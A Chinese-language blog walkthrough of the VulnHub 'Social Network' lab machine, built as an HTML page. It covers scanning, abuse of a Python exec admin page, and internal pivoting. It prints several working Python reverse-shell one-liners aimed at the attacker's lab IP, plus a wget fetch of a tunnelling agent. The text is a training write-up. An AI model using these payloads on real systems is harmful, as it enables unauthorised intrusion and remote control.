@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        Soclal Network | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">Soclal Network</div>
+        <div class="post-info">
+          
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a>
+
+
+          <span class="post-date">2023-03-19</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">arp-scan</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Netdiscover</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">目标 IP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">端口扫描后的思路</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">5000 端口</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">目录扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">Dirb</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">Dirsearch</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">发现&#x2F;admin 页面</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">代码执行</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">反弹shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">网页反弹python 反弹shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">反弹成功</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">判断  是否 是docker容器</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">内网</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">主机发现</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">内网穿透</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">**venom 工具 **</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">**proxychains 工具 **</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">内网端口扫描</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">172.17.0.3</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">内网目标主机</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">登录目标主机</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">内核提权</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+
+<p>攻击机：Kali                          靶机：Ubuntu<br>IP： 192.168.0.133                未知 </p>
+<p><a name="J2omD"></a></p>
+<h1><span id="信息收集">信息收集</span></h1><p>由于在于局域网   <br>使用  nmap  神器进行ip 发现 和扫描 <br>这里使用列出 几种 方式<br><a name="kAa4o"></a></p>
+<h2><span id="nmap">Nmap</span></h2><p><code>nmap  -sV -T4  -O  192.168.0.0/24   </code><br>-sV  版本探测    -T4  指定扫描过程中使用的时序模板   -O  主机系统探测 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667479187429-e8227eab-c509-43d6-baf2-f71b0dd5651c.png#averageHue=%23292d39&clientId=u19d0abbf-3f3c-4&from=paste&height=681&id=u93e590a0&name=image.png&originHeight=681&originWidth=1298&originalType=binary&ratio=1&rotation=0&showTitle=false&size=361488&status=done&style=none&taskId=u9d1aae88-6500-4e80-bda4-274c936de73&title=&width=1298" alt="image.png"></p>
+<p>还有在于局域网 可以使用二层的发现<br><a name="SnOzA"></a></p>
+<h2><span id="arp-scan">arp-scan</span></h2><p><code>arp-scan -l </code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667479257703-b98c24c8-2534-4f99-a1f3-0466a048b048.png#averageHue=%232a2d3b&clientId=u19d0abbf-3f3c-4&from=paste&height=202&id=uc2822437&name=image.png&originHeight=202&originWidth=1036&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90994&status=done&style=none&taskId=uff6bf513-ca2b-41a1-991e-72c245709f4&title=&width=1036" alt="image.png"></p>
+<p><a name="rDzko"></a></p>
+<h2><span id="netdiscover">Netdiscover</span></h2><p>Netdiscover<br> 专用于二层发现；可用于无线和交换网络环境；主动和被动探测；<br>netdiscover  -i  指定网卡  -r   网段<br>netdiscover -l IP.txt                                    #netdiscover -l 指定IP列表<br><code>netdiscover -i eth0 -r  192.168.0.1/24 </code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667479620277-ce22d82f-822c-46f2-94c2-58cae1c1da53.png#averageHue=%23272f3e&clientId=u19d0abbf-3f3c-4&from=paste&height=238&id=ue115e26e&name=image.png&originHeight=238&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51747&status=done&style=none&taskId=ud365dc75-b504-471e-b3d9-c1e7fd3e6ae&title=&width=800" alt="image.png"></p>
+<p><a name="oeadL"></a></p>
+<h2><span id="目标-ip">目标 IP</span></h2><p>找到目标 IP   <br>192.168.0.144 </p>
+<p><a name="s9oY0"></a></p>
+<h2><span id="端口扫描">端口扫描</span></h2><p><code>nmap -sV -p 1-65535 192.168.0.144  </code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667479786820-b028313a-b0e7-42f4-8d95-b03edd76a40d.png#averageHue=%23262d3c&clientId=u19d0abbf-3f3c-4&from=paste&height=243&id=ue43d5ba7&name=image.png&originHeight=243&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93936&status=done&style=none&taskId=u8f092178-899e-46e4-8b71-5166f1670e0&title=&width=865" alt="image.png"><br>可以看见开启了 22 端口 和 5000 端口<br><a name="v0O7Z"></a></p>
+<h3><span id="端口扫描后的思路">端口扫描后的思路</span></h3><p>22 端口   <br>进行弱密码进行爆破 <br>5000 端口  <br>查看版本信息 是   Werkzeug   0.14.1  （python2 .7 ）<br>基于python2.7 的 框架  <br>查看历史漏洞 <br>CVE-2019-14322  （目录遍历 ）<br>CVE-2019-14806  <br>好像没有什么好用的  <br>那就去看看 5000 端口 都什么页面<br><a name="kCnUn"></a></p>
+<h3><span id="5000-端口">5000 端口</span></h3><p> <img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667480362773-a1097539-d69d-4f2d-994b-cf7c2d7bb5c8.png#averageHue=%23f9f9f8&clientId=u19d0abbf-3f3c-4&from=paste&height=501&id=u599a0bc8&name=image.png&originHeight=501&originWidth=1475&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86194&status=done&style=none&taskId=ue7c4c97a-a430-4061-90ac-7747b1f2c76&title=&width=1475" alt="image.png"><br>这是一个 留言的 社交页面 并告诉我们是安全的 <br>留言  可能存在xss 漏洞   sql注入 等漏洞</p>
+<p><a name="DKnG1"></a></p>
+<h2><span id="目录扫描">目录扫描</span></h2><p>两款好用的目录扫描工具<br><a name="AEbqZ"></a></p>
+<h3><span id="dirb">Dirb</span></h3><p>&#96;&#96;dirb  <a target="_blank" rel="noopener" href="http://192.168.0.144:5000/">http://192.168.0.144:5000/</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667480772779-71b5924a-b008-4df6-aff1-a5983e16db61.png#averageHue=%23282c3a&clientId=u19d0abbf-3f3c-4&from=paste&height=407&id=ucd4f8552&name=image.png&originHeight=407&originWidth=701&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82741&status=done&style=none&taskId=u9a6cdb45-f7ff-41ef-819a-4e94eaaed8b&title=&width=701" alt="image.png"></p>
+<p><a name="AIK3O"></a></p>
+<h3><span id="dirsearch">Dirsearch</span></h3><p>&#96;&#96; dirsearch  -u “<a target="_blank" rel="noopener" href="http://192.168.0.144:5000/%22">http://192.168.0.144:5000/"</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667480826978-506a3dcc-2d4f-446f-845a-c02977354ed8.png#averageHue=%23262a35&clientId=u19d0abbf-3f3c-4&from=paste&height=356&id=u93df04e1&name=image.png&originHeight=356&originWidth=951&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54291&status=done&style=none&taskId=u1a2d55d6-a189-4348-a385-8ecdc227d38&title=&width=951" alt="image.png"></p>
+<p>留言页面没有发现漏洞<br><a name="FfZow"></a></p>
+<h2><span id="发现x2fadmin-页面">发现&#x2F;admin 页面</span></h2><p>在目录扫描中发现了  另外一个页面  &#x2F;admin<br> <img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667480916367-6761f26f-14bd-42be-a79e-f915a46f45bc.png#averageHue=%23fdfcfc&clientId=u19d0abbf-3f3c-4&from=paste&height=581&id=ua626ab0d&name=image.png&originHeight=581&originWidth=1143&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49421&status=done&style=none&taskId=ud52c9654-e24f-41aa-ab28-2d7ceb31a02&title=&width=1143" alt="image.png"><br>这个页面介绍了 <br>可以使用把输入的代码  发到exec  去执行<br><a name="ZbXlj"></a></p>
+<h1><span id="代码执行">代码执行</span></h1><p>这里由于是python的环境   <br>需要找到 是用python 写的 代码去反弹shell <br>找了 好久 的 python 反弹shell<br><a name="zu5aM"></a></p>
+<h3><span id="反弹shell">反弹shell</span></h3><p><a name="EaX3o"></a></p>
+<h3><span id="网页反弹python-反弹shell">网页反弹python 反弹shell</span></h3><p>这个靶场 我测试了 第一个 可以用其他 反弹shell 在这里不能反弹成功</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.0.133&quot;</span>,<span class="hljs-number">1234</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket,subprocess,os;<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);  <span class="hljs-comment"># 创建套接字；AF_INET（TCP/IP – IPv4）；SOCK_STREAM（TCP流）</span><br>s.connect((<span class="hljs-string">&quot;192.168.0.133&quot;</span>,<span class="hljs-number">1234</span>));  <span class="hljs-comment"># 要连接的ip地址和端口</span><br>os.dup2(s.fileno(),<span class="hljs-number">0</span>);  <span class="hljs-comment"># os.dup2()方法用于将一个文件描述符 fd 复制到另一个 fd2</span><br>os.dup2(s.fileno(),<span class="hljs-number">1</span>);  <span class="hljs-comment"># fileno()方法返回一个整型的文件描述符(file descriptor FD 整型)，可用于底层操作系统的 I/O 操作</span><br>os.dup2(s.fileno(),<span class="hljs-number">2</span>);  <span class="hljs-comment"># 使用fileno()返回一个整型的文件描述符，并使用os.dup2(s.fileno(),0)把这个整型的文件描述符复制到后面的0三个dup2函数先后将socket重定向到标准输入，标准输入，标准错误输出。</span><br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);  <span class="hljs-comment"># subprocess.call()执行由参数提供的命令，返回命令的状态，0或者非0</span><br>                                      <span class="hljs-comment"># 可以是[&quot;/bin/bash&quot;,&quot;-i&quot;]或[&quot;/bin/sh&quot;,&quot;-i&quot;]</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&quot;import os,socket,subprocess;</span><br><span class="hljs-string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">s.connect((&#x27;192.168.100.8&#x27;,4444));</span><br><span class="hljs-string">os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);</span><br><span class="hljs-string">os.dup2(s.fileno(),2);</span><br><span class="hljs-string">p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c  <span class="hljs-string">&#x27;import socket,subprocess,os;</span><br><span class="hljs-string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">s.connect((&quot;192.168.0.133&quot;,1234));</span><br><span class="hljs-string">os.dup2(s.fileno(),0);</span><br><span class="hljs-string">os.dup2(s.fileno(),1);</span><br><span class="hljs-string">os.dup2(s.fileno(),2);</span><br><span class="hljs-string">import pty;</span><br><span class="hljs-string">pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys,socket,os,pty;<br>s=socket.socket();<br>s.connect((os.getenv(<span class="hljs-string">&quot;192.168.0.133&quot;</span>),<span class="hljs-built_in">int</span>(os.getenv(<span class="hljs-string">&quot;1234&quot;</span>))));<br>[os.dup2(s.fileno(),fd) <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];pty.spawn(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p><a name="erdsv"></a></p>
+<h2><span id="反弹成功">反弹成功</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667483044245-541a5b0d-7903-453d-9a87-2080bbcabd1d.png#averageHue=%23292c39&clientId=u19d0abbf-3f3c-4&from=paste&height=355&id=u5913b210&name=image.png&originHeight=355&originWidth=1142&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73241&status=done&style=none&taskId=uffe5d13c-4fa0-459f-b347-a4e71c51d9d&title=&width=1142" alt="image.png"><br>这直接是root 权限 <br>ls 查看一下  <br>发现了dockerfile  文件 <br>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667483144808-e7b7b3e5-e4aa-4cae-894e-e581095a9177.png#averageHue=%23242837&clientId=u19d0abbf-3f3c-4&from=paste&height=125&id=ue5b125cc&name=image.png&originHeight=125&originWidth=1285&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20072&status=done&style=none&taskId=u1747bb24-059d-45d4-8289-644e8c38c5b&title=&width=1285" alt="image.png"><br><a name="bgBMJ"></a></p>
+<h3><span id="判断-是否-是docker容器">判断  是否 是docker容器</span></h3><p>方法一  ： <br> cat &#x2F;proc&#x2F;1&#x2F;cgroup<br>如果有这个文件   就代表一定是docker容器了 <br>blkio  有docker  而且hash 值就 在后面 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667483463195-ce2028d0-4c18-47b7-ba51-0b27dee8b671.png#averageHue=%232f3548&clientId=u19d0abbf-3f3c-4&from=paste&height=201&id=u39796e33&name=image.png&originHeight=201&originWidth=917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84367&status=done&style=none&taskId=u5ffc730f-f23a-4118-9ea7-fbf1687e527&title=&width=917" alt="image.png"></p>
+<p>方法二  ：<br>ls   .&#x2F;dockerenv  </p>
+<p>是docker容器 所以 要进行容器 逃逸 </p>
+<p><a name="y7Uud"></a></p>
+<h1><span id="内网">内网</span></h1><p><a name="wwxy1"></a></p>
+<h2><span id="主机发现">主机发现</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667483794240-d3b3de74-53e9-42b1-90e6-7f04d3d04d45.png#averageHue=%23282d3d&clientId=u19d0abbf-3f3c-4&from=paste&height=178&id=u6bebceb3&name=image.png&originHeight=178&originWidth=907&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52228&status=done&style=none&taskId=u17ade5b0-f85c-4eeb-9c92-86391976d0e&title=&width=907" alt="image.png"><br>本地 ip  和 一开始  ip 不一样更确定是docke’r 容器了  <br>进行内网扫描 ip  <br>最简单的方法就是 ping <br><code># 扫描172.17.1.1 - 172.17.254.254并提取有回包的ip</code><br><code>for i in $(seq 1 254);dofor j in $(seq 1 254);do ping -c 1 172.17.$i.$j | grep &quot;ttl&quot;;done;done</code><br>这里是 靶机 就扫描 几个就好 <br><code>for i in $(seq 1 10);do ping -c 1 172.17.0.$i | grep &quot;ttl&quot;;done</code></p>
+<p>存在的  IP 地址 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667485257718-f287b12f-a81c-428f-8a9d-3044e4d04aca.png#averageHue=%23282d3e&clientId=u19d0abbf-3f3c-4&from=paste&height=79&id=ube8edc61&name=image.png&originHeight=79&originWidth=717&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20369&status=done&style=none&taskId=u6d5580e1-2a9f-4944-a404-151dc99e0bb&title=&width=717" alt="image.png"><br>存在 ip   1，  2    ，   3<br>接下来就需要对<strong>172.17.0.1</strong>和<strong>172.17.0.3</strong>进行端口扫描，看看它们上面开启了什么服务、有没有漏洞、是否可以渗透进去<br>  </p>
+<p><a name="YU0wx"></a></p>
+<h2><span id="内网穿透">内网穿透</span></h2><p>由于172.17处于内网网段，kali无法直接访问到，要解决这个问题需要借助内网穿透技术，将kali到172.17内网之间的网络路由打通<br><a name="MQudd"></a></p>
+<h3><span id="venom-工具">**venom 工具 **</span></h3><p><strong>利用venom这个工具可以很方便的在kali与内网之间建立一条隧道，然后基于这个隧道生成一个代理，使kali中的众多工具可以通过这个代理访问到目标靶机的内网</strong><br>**venom  **工具gitHub地址：<a target="_blank" rel="noopener" href="https://github.com/Dliv3/Venom">GitHub - Dliv3&#x2F;Venom: Venom - A Multi-hop Proxy for Penetration Testers</a><br>下载到 linux 之后 解压打开 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667485744073-d07891f2-4829-4c76-a566-bd26129793c0.png#averageHue=%23242b39&clientId=u19d0abbf-3f3c-4&from=paste&height=96&id=u59bc436f&name=image.png&originHeight=96&originWidth=1027&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27030&status=done&style=none&taskId=u9833d849-a276-48df-afd4-703c454b10b&title=&width=1027" alt="image.png"></p>
+<p>将<strong>agent_linux_x64</strong>这个客户端传输到目标系统上，在本机上运行对应的服务端<strong>admin_linux_x64</strong><br>kali本机运行<strong>admin_linux_x64</strong>，侦听<strong>9999</strong>端口<br>执行命令：**.&#x2F;admin_linux_x64 -lport 9999**<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667485902438-bd97f0c3-f6b0-4398-99cd-10ff397a4b5d.png#averageHue=%23242835&clientId=u19d0abbf-3f3c-4&from=paste&height=200&id=uf89345d1&name=image.png&originHeight=200&originWidth=702&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26364&status=done&style=none&taskId=uf6417a8d-b440-4a4d-a3fb-64c4b50cd1e&title=&width=702" alt="image.png"></p>
+<p>把客服端给 靶机  <br>kali 开启 http服务 <br><code>python3 -m http.server 80 </code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667486025846-524169f2-4c28-47e2-b99a-4c010f50dbf9.png#averageHue=%23242833&clientId=u19d0abbf-3f3c-4&from=paste&height=122&id=u218a21ae&name=image.png&originHeight=122&originWidth=548&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16397&status=done&style=none&taskId=u57ca67b4-6367-4b67-acc9-4a3f0b7310f&title=&width=548" alt="image.png"><br>靶机 使用 wget  去获取  客服端文件 <br><code>wget  http://192.168.0.133/agent_linux_x64 </code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667486113871-0eadd13c-addf-4cc6-a788-574f270b3bd2.png#averageHue=%23252834&clientId=u19d0abbf-3f3c-4&from=paste&height=227&id=u0b19185c&name=image.png&originHeight=227&originWidth=1015&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60520&status=done&style=none&taskId=uecd391d9-fe97-4666-a522-91d952cacc5&title=&width=1015" alt="image.png"><br>赋可执行权限 <br><code>chmod +x  agent_linux_x64</code><br>客服端建立连接 <br><code>./agent_linux_x64  -rhost 192.168.0.133  -rport 9999</code>  目标主机 和端口 <br>kali 接收到 客服端请求连接 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667486337153-41caf055-add9-4ddb-986b-337bd6e40d14.png#averageHue=%23242732&clientId=u19d0abbf-3f3c-4&from=paste&height=229&id=uf63ddf37&name=image.png&originHeight=229&originWidth=742&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31939&status=done&style=none&taskId=u7c5ba9bf-7fde-4923-b0af-a0a90c8c639&title=&width=742" alt="image.png"></p>
+<p>服务端启动<strong>socks</strong>侦听端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">show  展示已经连接的客服端 <br>goto <span class="hljs-number">1</span>  goto到<span class="hljs-number">1</span> 客服端 <br>socks <span class="hljs-number">1080</span>  启动sockes 侦听本机 <span class="hljs-number">1080</span> 端口<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667486483468-c4b57dee-2fb8-49e2-9299-6f344b4b797a.png#averageHue=%23242731&clientId=u19d0abbf-3f3c-4&from=paste&height=222&id=u975792b9&name=image.png&originHeight=222&originWidth=757&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27762&status=done&style=none&taskId=udaa06855-6fdd-45f9-95c8-7b1418ec1b8&title=&width=757" alt="image.png"><br><a name="iLsBo"></a></p>
+<h3><span id="proxychains-工具">**proxychains 工具 **</span></h3><p>为了让kali上的所有工具都可以挂代理访问内网，还需要使用<strong>proxychains</strong>这个工具<br>修改<strong>proxychains</strong>的配置文件，配置代理类型、IP、端口<br>执行命令： <code>**sudo vim /etc/proxychains4.conf**</code><br>修改成 socke5    127.0.0.1 1080 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667486914247-2997dae4-4a9e-480d-be8f-a2a5104cbbb1.png#averageHue=%23242938&clientId=u19d0abbf-3f3c-4&from=paste&height=130&id=ud6afd086&name=image.png&originHeight=130&originWidth=568&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22270&status=done&style=none&taskId=ub6c7f944-0238-47b0-bb6e-14cca6ca311&title=&width=568" alt="image.png"> </p>
+<p><a name="qXxgA"></a></p>
+<h2><span id="内网端口扫描">内网端口扫描</span></h2><p>使用工具 前面要加上  **proxychains  **<br><code>**proxychains nmap -Pn -sT 172.17.0.1  **</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667487412446-93fc8e8d-eff5-4473-8aa3-82a8313d696d.png#averageHue=%23262a35&clientId=u19d0abbf-3f3c-4&from=paste&height=135&id=u000fe954&name=image.png&originHeight=135&originWidth=770&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48606&status=done&style=none&taskId=u1954aa6c-d1ae-4c5f-8267-dbd70dd8e81&title=&width=770" alt="image.png"><br>还是开了5000 端口 <br>**proxychains nmap -Pn -sT 172.17.0.2 **<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667487466341-86f80d60-6c6b-4962-ac26-f10293545e38.png#averageHue=%23272b37&clientId=u19d0abbf-3f3c-4&from=paste&height=219&id=u53cc04eb&name=image.png&originHeight=219&originWidth=880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80978&status=done&style=none&taskId=ub76a0357-f369-4f44-bde0-21cae1e47ed&title=&width=880" alt="image.png"><br>也是5000 端口 </p>
+<p>对网页进行查看 <br>设置浏览器代理 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667487650201-6c1c401f-4371-42c7-aea1-d591510d8fee.png#averageHue=%233d3d48&clientId=u19d0abbf-3f3c-4&from=paste&height=532&id=u993f4650&name=image.png&originHeight=532&originWidth=806&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65944&status=done&style=none&taskId=u488de076-6b86-47bb-9905-f79711e114d&title=&width=806" alt="image.png"></p>
+<p>和 容器一样的 服务 <br>172.17.0.1 和 2  是一样的服务  <img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667487704561-1ce40345-0f27-4aa2-9f5d-129ea0d6bf3d.png#averageHue=%23fdfcfc&clientId=u19d0abbf-3f3c-4&from=paste&height=512&id=uc0f5a336&name=image.png&originHeight=512&originWidth=1105&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47428&status=done&style=none&taskId=u5597ef5a-a995-471f-aabe-d2fe8b38117&title=&width=1105" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667487885697-3379c80c-cfdc-47dc-9ec2-a2c4b679b667.png#averageHue=%23b3916e&clientId=u19d0abbf-3f3c-4&from=paste&height=531&id=u081a2b52&name=image.png&originHeight=531&originWidth=1218&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90592&status=done&style=none&taskId=uc5ed5528-2c4b-4f90-a5a1-0384445fbe5&title=&width=1218" alt="image.png"><br>172.0.0.3   是一个 wap-wsp</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667488827597-f856e098-89eb-4e2b-8cf3-fe3690966f95.png#averageHue=%23272b36&clientId=u19d0abbf-3f3c-4&from=paste&height=177&id=u86d51bf9&name=image.png&originHeight=177&originWidth=1073&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87951&status=done&style=none&taskId=u36799596-95d5-4e20-ab63-6fb02da2df3&title=&width=1073" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1667488196983-22a4127a-cc90-4d0f-ab65-41612b867d45.png#averageHue=%23dfd1b4&clientId=u19d0abbf-3f3c-4&from=paste&height=421&id=u0d309bb8&name=image.png&originHeight=421&originWidth=1100&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56650&status=done&style=none&taskId=u8e1e9b1f-b2ba-40c0-bbca-8609b99815e&title=&width=1100" alt="image.png"></p>
+<p><a name="WVWI2"></a></p>
